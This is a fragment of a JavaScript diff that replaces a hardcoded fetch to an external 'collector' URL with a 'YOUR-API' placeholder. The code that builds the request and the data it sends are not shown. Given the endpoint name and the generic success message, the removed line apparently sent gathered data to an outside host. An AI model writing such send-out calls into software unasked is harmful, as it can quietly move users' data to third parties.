@@ -79,7 +79,7 @@
     };
   
     try {
-      const response = await fetch("https://adonisbots.com/collector", options);
+      const response = await fetch("YOUR-API", options);
       if (response.ok) {
         console.log('Script executed successfully!');
       } else {
